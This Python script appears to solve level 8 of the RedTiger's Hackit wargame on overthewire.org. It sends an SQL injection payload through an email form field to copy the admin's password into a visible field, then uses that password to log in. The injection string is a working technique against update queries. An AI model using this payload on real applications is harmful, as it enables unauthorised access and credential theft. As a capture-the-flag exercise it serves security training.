#!/usr/bin/env python3
import pickle
import tigers as tg
from bs4 import BeautifulSoup
import tiger_cookies
from connect import my_request as req


def main():
    '''
    Injection by parameters

    Target: Get the password of the admin.
    '''
    url = "https://redtiger.labs.overthewire.org/level8.php"
    finds = 'name'  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level8login'

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level8login=cooks[level])

    # Payload
    data = dict(email="',name = password,email = '", edit="Edit")
    response = req.post_request(url, data, cook)

    soup = BeautifulSoup(response, 'html.parser')
    passw = soup.find('input', {'name': 'name'})['value']

    # Authorization
    data = dict(user='Admin', password=passw, login='Login')
    response = req.post_request(url, data, cook)

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
